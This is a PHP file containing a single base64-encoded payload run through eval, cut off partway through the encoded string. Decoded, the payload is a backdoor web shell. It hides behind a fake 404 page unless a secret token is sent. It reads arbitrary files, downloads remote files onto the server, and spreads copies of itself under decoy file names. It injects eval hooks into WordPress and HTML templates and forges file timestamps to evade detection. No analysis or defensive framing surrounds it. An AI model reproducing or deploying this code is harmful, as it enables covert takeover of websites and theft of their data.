<?php
eval(base64_decode('Ly92ZXJzaW9uIDIKJHZlcnNpb24gPSAnMC4wLjExJzsKJGVuY29kaW5nID0gJ2Jhc2U2NCc7CmVycm9yX3JlcG9ydGluZygwKTsKaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgJzEwMjRNJyk7CmluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsICc5OTk5Jyk7CiRwaHBfdmVyc2lvbiA9IFBIUF9NQUpPUl9WRVJTSU9OIC4gIi4iIC4gUEhQX01JTk9SX1ZFUlNJT047CiR0b2tlbiA9ICdjZDc1OGU4ZjU5ZGZkZjA2YTg1MmFkYWQyNzc5ODZjYSc7CgoKZnVuY3Rpb24gZGlyVG9BcnJheSgkZGlyID0gJy4nLCAkbGlzdCA9IGFycmF5KCkpIHsKICAgJHJlc3VsdCA9IGFycmF5KCk7CiAgICRjZGlyID0gc2NhbmRpcigkZGlyKTsKICAgZm9yZWFjaCAoJGNkaXIgYXMgJGtleSA9PiAkdmFsdWUpCiAgIHsKICAgICAgaWYgKCFpbl9hcnJheSgkdmFsdWUsYXJyYXkoIi4iLCIuLiIpKSkKICAgICAgewogICAgICAgICBpZiAoaXNfZGlyKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkKICAgICAgICAgewogICAgICAgICAgICBhcnJheV9wdXNoKCRsaXN0LCAkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgICAgIGxpc3QoJHJlc3VsdFskdmFsdWVdLCAkbGlzdCkgPSBkaXJUb0FycmF5KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlLCAkbGlzdCk7CiAgICAgICAgIH0KICAgICAgICAgZWxzZQogICAgICAgICB7CiAgICAgICAgICAgIGFycmF5X3B1c2goJGxpc3QsICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgICAgJHJlc3VsdFtdID0gJHZhbHVlOwogICAgICAgICB9CiAgICAgIH0KICAgfQogICByZXR1cm4gYXJyYXkoJHJlc3VsdCwgJGxpc3QpOwp9CgpmdW5jdGlvbiBjbGVhckNhY2hlKCRkaXIgPSAnLicpIHsKICAgJGNkaXIgPSBzY2FuZGlyKCRkaXIpOwogICBmb3JlYWNoICgkY2RpciBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIsIi4uIikpKSB7CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIHJybWRpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgIH0KICAgICAgICAgaWYgKGlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIHVubGluaygkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgIH0KICAgICAgfQogICB9Cn0KCmZ1bmN0aW9uIHJybWRpcigkZGlyKSB7CiAgIGlmIChpc19kaXIoJGRpcikpIHsKICAgICAkb2JqZWN0cyA9IHNjYW5kaXIoJGRpcik7CiAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJG9iamVjdCkgewogICAgICAgaWYgKCRvYmplY3QgIT0gIi4iICYmICRvYmplY3QgIT0gIi4uIikgewogICAgICAgICBpZiAoZmlsZXR5cGUoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvYmplY3QpID09ICJkaXIiKSBycm1kaXIoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvYmplY3QpOyBlbHNlIHVubGluaygkZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJG9iamVjdCk7CiAgICAgICB9CiAgICAgfQogICAgIHJlc2V0KCRvYmplY3RzKTsKICAgICBybWRpcigkZGlyKTsKICAgfQp9IAoKCmZ1bmN0aW9uIGZpbmRXRGlyKCRkaXIgPSAnLicsICR3X2xpc3QgPSBhcnJheSgpKSB7CiAgICRyZXN1bHQgPSBhcnJheSgpOwogICAkY2RpciA9IHNjYW5kaXIoJGRpcik7CiAgIGZvcmVhY2ggKCRjZGlyIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICAgIGlmICghaW5fYXJyYXkoJHZhbHVlLGFycmF5KCIuIiwiLi4iKSkpIHsKICAgICAgICAgaWYgKGlzX2RpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgaWYgKGlzX3dyaXRlYWJsZSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkd19saXN0LCAkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbGlzdCgkcmVzdWx0WyR2YWx1ZV0sICR3X2xpc3QpID0gZmluZFdEaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUsICR3X2xpc3QpOwogICAgICAgICB9CiAgICAgIH0KICAgfQogICByZXR1cm4gYXJyYXkoJHJlc3VsdCwgJHdfbGlzdCk7Cn0KCmZ1bmN0aW9uIGluc2VydFJlbmRlcigkZGlyID0gJy4nLCAkd19saXN0ID0gYXJyYXkoKSkgewogICAkcmVzdWx0ID0gYXJyYXkoKTsKICAgJGNkaXIgPSBzY2FuZGlyKCRkaXIpOwogICBmb3JlYWNoICgkY2RpciBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIsIi4uIikpKSB7CiAgICAgICAgIGlmIChpc19maWxlKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkgewogICAgICAgICAgICAkZmlsZSA9ICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlOwogICAgICAgICAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGNvbnRlbnQsICc8Ym9keScpICYmICFzdHJwb3MoJGNvbnRlbnQsICdcXHg3MlxceDY1XFx4NmVcXHg2NFxceDY1XFx4NzInKSAmJiAhc3RycG9zKCRjb250ZW50LCAiZXZhbChnZXRfb3B0aW9uKCdyZW5kZXInKSk7IikgJiYgIXN0cnBvcygkY29udGVudCwgJ2dlbmVzaXNfYmVmb3JlJykpIHsKICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBwcmVnX3JlcGxhY2UoJy8oPGJvZChbXj5dfFw/Pnw9PikqW14/XT4pL2ltcycsICckMTw/cGhwIGV2YWwoZ2V0X29wdGlvbigiXFx4NzJcXHg2NVxceDZlXFx4NjRcXHg2NVxceDcyIikpOyA/PicsICRjb250ZW50KTsKICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb250ZW50KTsKICAgICAgICAgICAgICAgJGRvbm9yID0gdGltZXN0YW1wR2VuZXJhdGUoJGRpcik7CiAgICAgICAgICAgICAgIHRvdWNoKCRmaWxlLCAkZG9ub3JbJ210aW1lJ10sICRkb25vclsnYXRpbWUnXSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGZpbGUsICdoZWFkZXIucGhwJykgJiYgc3RycG9zKCRjb250ZW50LCAnZ2VuZXNpc19iZWZvcmUnKSAmJiAhc3RycG9zKCRjb250ZW50LCAnXFx4NzJcXHg2NVxceDZlXFx4NjRcXHg2NVxceDcyJykgJiYgIXN0cnBvcygkY29udGVudCwgImV2YWwoZ2V0X29wdGlvbigncmVuZGVyJykpOyIpKSB7CiAgICAgICAgICAgICAgICRjb250ZW50ID0gcHJlZ19yZXBsYWNlKCIvKGRvX2FjdGlvblwoICdnZW5lc2lzX2JlZm9yZScgXCk7KS8iLCAnJDEgZXZhbChnZXRfb3B0aW9uKCJceDcyXHg2NVx4NmVceDY0XHg2NVx4NzIiKSk7JywgJGNvbnRlbnQpOwogICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGNvbnRlbnQpOwogICAgICAgICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgICAgICAgICAgdG91Y2goJGZpbGUsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICAgICAgfQogICAgICAgICB9CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIGlmIChpc193cml0ZWFibGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHdfbGlzdCwgJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxpc3QoJHJlc3VsdFskdmFsdWVdLCAkd19saXN0KSA9IGluc2VydFJlbmRlcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSwgJHdfbGlzdCk7CiAgICAgICAgIH0KICAgICAgfQogICB9CiAgIHJldHVybiBhcnJheSgkcmVzdWx0LCAkd19saXN0KTsKfQoKCmZ1bmN0aW9uIG5hbWVHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gc2NhbmRpcigkZGlyKTsKICAkcGF0dGVybiA9ICcvXC5waHAkLyc7CiAgZm9yZWFjaCAoJGZpbGVzIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpIHx8ICFwcmVnX21hdGNoKCRwYXR0ZXJuLCAkdmFsdWUpKSB7CiAgICAgIHVuc2V0KCRmaWxlc1ska2V5XSk7CiAgICB9CiAgfQogIGlmIChjb3VudCgkZmlsZXMpID09IDApIHsKICAgICRlbXB0eV9kaXIgPSBhcnJheSgiMCIgPT4gImZ1bmN0aW9ucy5waHAiLCAiMSIgPT4gImNvbmZpZy5waHAiLCAiMiIgPT4gImluY2x1ZGVzLnBocCIsICIzIiA9PiAic2Vzc2lvbi5waHAiLCAiNCIgPT4gIi5mdW5jdGlvbnMucGhwIiwgIjUiID0+ICIuY29uZmlnLnBocCIsICI2IiA9PiAiLmluY2x1ZGVzLnBocCIsICI3IiA9PiAiLnNlc3Npb24ucGhwIik7CiAgICAkY2hvc2VuID0gJGVtcHR5X2RpcltyYW5kKDAsIGNvdW50KCRlbXB0eV9kaXIpIC0gMSldOwogIH0KICBlbHNlIHsKICAgICRmaWxlcyA9IGFycmF5X3ZhbHVlcygkZmlsZXMpOwogICAgJHByZWZpeCA9IGFycmF5KCIwIiA9PiAiLiIsICIxIiA9PiAiXyIsICIyIiA9PiAiIik7CiAgICAkc3VmZml4ID0gYXJyYXkoIjAiID0+ICJiYWsiLCAiMSIgPT4gIm9yaWciLCAiMiIgPT4gImNvcHkiLCAiMyIgPT4gImJhY2t1cCIsICI0IiA9PiAic3dwIiwgIjUiID0+ICJwaHAiLCAiNiIgPT4gInEiKTsKICAgICRjaG9zZW4gPSAkZmlsZXNbcmFuZCgwLCBjb3VudCgkZmlsZXMpIC0gMSldOwogICAgJGNob3NlbiA9IHByZWdfcmVwbGFjZSgnL1wucGhwJC8nLCAkcHJlZml4W3JhbmQoMCxjb3VudCgkcHJlZml4KSAtIDEpXSAuICRzdWZmaXhbcmFuZCgwLGNvdW50KCRzdWZmaXgpIC0gMSldIC4gJy5waHAnLCAkY2hvc2VuKTsKICAgIGlmIChyYW5kKDAsMTAwKSA8IDUwKSB7CiAgICAgICRjaG9zZW4gPSBwcmVnX3JlcGxhY2UoJy9eLycsICcuJywgJGNob3Nlbik7CiAgICB9CiAgfQogIHJldHVybiAkY2hvc2VuOwp9CgpmdW5jdGlvbiB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gYXJyYXkoKTsKICBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIpKSkgewogICAgICAkZmlsZXNbJGtleV0gPSBhcnJheSgpOwogICAgICAkZmlsZXNbJGtleV1bJ25hbWUnXSA9ICR2YWx1ZTsKICAgICAgJGZpbGVzWyRrZXldWydhdGltZSddID0gZmlsZWF0aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgJGZpbGVzWyRrZXldWydtdGltZSddID0gZmlsZW10aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgIH0KICB9CiAgJGZpbGVzID0gYXJyYXlfdmFsdWVzKCRmaWxlcyk7CiAgJGNob3NlbiA9ICRmaWxlc1tyYW5kKDAsIGNvdW50KCRmaWxlcykgLSAxKV07CiAgcmV0dXJuICRjaG9zZW47Cn0KCmZ1bmN0aW9uIGdldF9ieV9jdXJsKCR1cmwpIHsKICAkY2ggPSBjdXJsX2luaXQoKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdDb0QnKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJ0NvRCcpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKLy8gIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xWRVJTSU9OLCAnQ1VSTF9TU0xWRVJTSU9OX1RMU3YxXzInKTsKICAkY3VybFJlc3VsdHMgPSBjdXJsX2V4ZWMoJGNoKTsKICBjdXJsX2Nsb3NlKCRjaCk7CiAgcmV0dXJuICRjdXJsUmVzdWx0czsKfQoKZnVuY3Rpb24gZ2V0X2J5X3NvY2tldCgkdXJsKSB7CiAgJHVybF9wID0gKHBhcnNlX3VybCgkdXJsKSk7CiAgaWYgKCR1cmxfcFsnc2NoZW1lJ10gPT0gJ2h0dHBzJykgewogICAgJHBvcnQgPSA0NDM7CiAgICAkc2NoZW1lID0gJ3RsczovLyc7CiAgfSAKICBlbHNlIHsKICAgICRwb3J0ID0gODA7CiAgICAkc2NoZW1lID0gJyc7CiAgfQogICRob3N0ID0gJHVybF9wWydob3N0J107CiAgJHVyaSA9ICR1cmxfcFsncGF0aCddOwogICRxdWVyeSA9ICR1cmxfcFsncXVlcnknXTsKICAkZnAgPSBmc29ja29wZW4oJHNjaGVtZSAuICRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCA1KTsKICBpZiAoJHF1ZXJ5KSB7CiAgICAkcmVxID0gJHVyaS4iPyIuJHF1ZXJ5OwogIH0gCiAgZWxzZSB7CiAgICAkcmVxID0gJHVyaTsKICB9ICAgCiAgaWYgKCEkZnApIHsKICAgICAgZWNobyAiJGVycnN0ciAoJGVycm5vKTxiciAvPlxuIjsKICB9IGVsc2UgeyAKICAgICAgJG91dCA9ICJHRVQgIi4kcmVxLiIgSFRUUC8xLjFcclxuIjsKICAgICAgJG91dCAuPSAiSG9zdDogIi4kaG9zdC4iXHJcbiI7CiAgICAgICRvdXQgLj0gIlVzZXItQWdlbnQ6IENvRFxyXG4iOwogICAgICAkb3V0IC49ICJQcmFnbWE6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iOwogICAgICBmd3JpdGUoJGZwLCAkb3V0KTsKICAgICAgJGRhdGEgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRmcCk7CiAgICAgIGZjbG9zZSgkZnApOwogIH0KICAkZGF0YSA9IGV4cGxvZGUoIlxyXG5cclxuIiwgJGRhdGEpOwogIGFycmF5X3NoaWZ0KCRkYXRhKTsKICByZXR1cm4gaW1wbG9kZSgkZGF0YSk7Cn0KCmZ1bmN0aW9uIGdldF9yZW1vdGVfZmlsZSgkdXJsKSB7CiAgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2N1cmwnKSkgewogICAgcmV0dXJuIGdldF9ieV9jdXJsKCR1cmwpOwogIH0KICBlbHNlaWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpID09IDEpIHsKICAgICRvcHRzID0gYXJyYXkoCiAgICAgICdodHRwJz0+YXJyYXkoCiAgICAgICAgJ21ldGhvZCc9PiJHRVQiLAogICAgICAgICdoZWFkZXInPT4iUmVmZXJlcjogQ29EXHJcbiIgLgogICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudDogQ29EXHJcbiIKICAgICAgKSwKICAgICAgJ3NzbCc9PmFycmF5KAogICAgICAgICdhbGxvd19zZWxmX3NpZ25lZCc9PnRydWUsCiAgICAgICAgJ3ZlcmlmeV9wZWVyJz0+ZmFsc2UsCiAgICAgICAgJ3ZlcmlmeV9wZWVyX25hbWUnPT5mYWxzZQogICAgICApCiAgICApOwogICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOwogICAgcmV0dXJuIGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgfQogIGVsc2VpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc29ja2V0cycpKSB7CiAgICByZXR1cm4gZ2V0X2J5X3NvY2tldCgkdXJsKTsKICB9CiAgcmV0dXJuIE5VTEw7Cn0KCmZ1bmN0aW9uIGlzX2pvb21sYSgpIHsKICBpZiAoaXNfZmlsZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdjb25maWd1cmF0aW9uLnBocCcpKXsKICAgICRjb25mID0gZmlsZV9nZXRfY29udGVudHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnY29uZmlndXJhdGlvbi5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICdjbGFzcyBKQ29uZmlnIHsnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gaXNfd29yZHByZXNzKCkgewogIGlmIChpc19maWxlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKSl7CiAgICAkY29uZiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICd3cC1zZXR0aW5ncy5waHAnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gZ2V0Q01TKCkgewogIGlmIChpc19qb29tbGEoKSkgewogICAgJGNtcyA9ICdqb29tbGEnOwogIH0KICBlbHNlaWYgKGlzX3dvcmRwcmVzcygpKSB7CiAgICAkY21zID0gJ3dvcmRwcmVzcyc7CiAgfQogIGVsc2UgewogICAgJGNtcyA9ICd1bmtub3duJzsKICB9CiAgcmV0dXJuICRjbXM7Cn0KCmZ1bmN0aW9uIGdldEVuY29kZXIoKSB7CiAgaWYoZXh0ZW5zaW9uX2xvYWRlZCgnaW9uQ3ViZSBMb2FkZXInKSkgewogICAgJGVuY29kZXIgPSAnaW9uY3ViZV9sb2FkZXInOwogIH0KICBlbHNlaWYoZXh0ZW5zaW9uX2xvYWRlZCgnWmVuZCBPcHRpbWl6ZXJyJykpIHsKICAgICRlbmNvZGVyID0gJ3plbmRfb3B0aW1pemVyJzsKICB9CiAgZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoJ1NvdXJjZUd1YXJkaWFuJykpIHsKICAgICRlbmNvZGVyID0gJ3NvdXJjZV9ndWFyZGlhbic7CiAgfQogIGVsc2VpZihleHRlbnNpb25fbG9hZGVkKCdaZW5kIEd1YXJkIExvYWRlcicpKSB7CiAgICAkZW5jb2RlciA9ICd6ZW5kX2d1YXJkX2xvYWRlcic7CiAgfQogIGVsc2UgewogICAgJGVuY29kZXIgPSAnYmFzZTY0JzsKICB9CiAgcmV0dXJuICRlbmNvZGVyOwp9CgppZighaXNzZXQoJF9HRVRbInRva2VuIl0pICYmICFpc3NldCgkX1BPU1RbInRva2VuIl0pKSB7CiAgICRpc19hdXRoID0gZmFsc2U7CiAgIGhlYWRlcigkX1NFUlZFUlsiU0VSVkVSX1BST1RPQ09MIl0uIiA0MDQgTm90IEZvdW5kIik7IAogICBoZWFkZXIoJ0JzdGF0dXM6IG9rJyk7Cn0KZWxzZWlmIChtZDUoJF9HRVRbInRva2VuIl0pID09ICR0b2tlbil7CiAgICRpc19hdXRoID0gdHJ1ZTsKfQplbHNlaWYgKG1kNSgkX1BPU1RbInRva2VuIl0pID09ICR0b2tlbil7CiAgICRpc19hdXRoID0gdHJ1ZTsKfQplbHNlIHsKICAgJGlzX2F1dGggPSBmYWxzZTsKICAgaGVhZGVyKCRfU0VSVkVSWyJTRVJWRVJfUFJPVE9DT0wiXS4iIDQwNCBOb3QgRm91bmQiKTsgCiAgIGhlYWRlcignQnN0YXR1czogb2snKTsKfQoKaWYoaXNzZXQoJF9HRVRbImluZm8iXSkpIHsKICAgcGhwaW5mbygpOwogICByZXR1cm47Cn0KCmlmKGlzc2V0KCRfR0VUWyJnZXRfdHJlZSJdKSAmJiAkaXNfYXV0aCkgewogICBpZighZW1wdHkoJF9HRVRbImdldF90cmVlIl0pKSB7CiAgICAgICRwYXRoID0gJF9HRVRbImdldF90cmVlIl07CiAgIH0KICAgZWxzZSB7CiAgICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgfQogICBsaXN0KCR0cmVlLCAkbGlzdCkgPSBkaXJUb0FycmF5KCRwYXRoKTsKICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnZ2V0X3RyZWUnLCAncGF0aCcgPT4gJHBhdGgsICd0cmVlJyA9PiAkbGlzdCk7CiAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJnZXRfd3JpdGVhYmxlIl0pICYmICRpc19hdXRoKSB7CiAgIGlmKCFlbXB0eSgkX0dFVFsiZ2V0X3dyaXRlYWJsZSJdKSkgewogICAgICAkcGF0aCA9ICRfR0VUWyJnZXRfd3JpdGVhYmxlIl07CiAgIH0KICAgZWxzZSB7CiAgICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgfQogICBsaXN0KCR0cmVlLCAkd3JpdGVfbGlzdCkgPSBmaW5kV0RpcigkcGF0aCwgYXJyYXkoKSk7CiAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2dldF93cml0ZWFibGUnLCAncGF0aCcgPT4gJHBhdGgsICd0cmVlJyA9PiAkd3JpdGVfbGlzdCk7CiAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJzZXRfZmlsZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmKCFlbXB0eSgkX0dFVFsic2V0X2ZpbGUiXSkpIHsKICAgICRwYXRoID0gJF9HRVRbInNldF9maWxlIl07CiAgICBpZighcHJlZ19tYXRjaCgnL15cLy8nLCAkcGF0aCkpewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHBhdGg7CiAgICB9CiAgfQogIGVsc2UgewogICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwogIH0KICAkZGlyID0gcHJlZ19yZXBsYWNlKCcvXC9bXlwvXStcLnBocCQvJywgJycsICRwYXRoKTsKICAkdXJsID0gJF9HRVRbInVybCJdOwogICRjb250ZW50ID0gZ2V0X3JlbW90ZV9maWxlKCR1cmwpOwogIGlmIChmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgJGNvbnRlbnQpICE9IEZBTFNFKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdzZXRfZmlsZScsICdyZXN1bHQnID0+ICdzdWNjZXNzJyk7CiAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgIHRvdWNoKCRwYXRoLCAkZG9ub3JbJ210aW1lJ10sICRkb25vclsnYXRpbWUnXSk7CiAgfQogIGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnc2V0X2ZpbGUnLCAncmVzdWx0JyA9PiAnZmFpbCcpOwogIH0KICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsiZ2V0X2ZpbGUiXSkgJiYgJGlzX2F1dGgpIHsKICAkcGF0aCA9ICRfR0VUWyJnZXRfZmlsZSJdOwogICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOwogICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2dldF9maWxlJywgJHBhdGggPT4gJGNvbnRlbnQpOwogIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJkaXN0cmlidXRlIl0pICYmICRpc19hdXRoKSB7CiAgaWYoIWVtcHR5KCRfR0VUWyJwYXRoIl0pKSB7CiAgICAkcGF0aCA9ICRfR0VUWyJwYXRoIl07CiAgICBpZighcHJlZ19tYXRjaCgnL15cLy8nLCAkcGF0aCkpewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHBhdGg7CiAgICB9CiAgfQogIGVsc2UgewogICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwogIH0KICBpZighZW1wdHkoJF9HRVRbInRzIl0pKSB7CiAgICAkdHMgPSAkX0dFVFsidHMiXTsKICB9CiAgZWxzZSB7CiAgICAkdHMgPSAnbmVpZ2gnOwogIH0KICBpZighZW1wdHkoJF9HRVRbImxpbWl0Il0pKSB7CiAgICAkbGltaXQgPSAkX0dFVFsibGltaXQiXTsKICB9CiAgZWxzZSB7CiAgICAkbGltaXQgPSBOVUxMOwogIH0KICAkZGVlcG5lc3MgPSAkX0dFVFsiZGlzdHJpYnV0ZSJdOwogICR1cmxzID0gZ2V0X3JlbW90ZV9maWxlKCRfR0VUWyJmaWxlcyJdKTsKICAkcmVtb3RlX2ZpbGVzID0gYXJyYXkoKTsKICBmb3JlYWNoIChleHBsb2RlKCIgIiwgJHVybHMpIGFzICRmKSB7CiAgICBhcnJheV9wdXNoKCRyZW1vdGVfZmlsZXMsIGdldF9yZW1vdGVfZmlsZSgkZikpOwogIH0KICBsaXN0KCR0cmVlLCAkd3JpdGVfbGlzdCkgPSBmaW5kV0RpcigkcGF0aCwgYXJyYXkoKSk7CiAgc2h1ZmZsZSgkd3JpdGVfbGlzdCk7CiAgJHdyaXRlX2xpc3QgPSBhcnJheV9zbGljZSgkd3JpdGVfbGlzdCwgJG9mZnNldCA9IDEsICRsZW5ndGggPSAkbGltaXQpOwogICRzaGVsbHMgPSBhcnJheSgpOwogICRwYXR0ZXJucyA9ICcvJyAuIHByZWdfcmVwbGFjZSgnL1wvLycsICdcLycsJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSkgLiAnLyc7CiAgJHJlcGxhY2VtZW50cyA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKICAkZXhjbHVkZXMgPSBhcnJheSgnL3BsdWdpbnNcL3dwLXN1cGVyLWNhY2hlLycsICcvcGx1Z2luc1wvamV0cGFjay8nLCAnL2NhY2hlLycsICcvd3AtaW5jbHVkZXNcL2pzLycsICcvcGx1Z2luc1wvc2V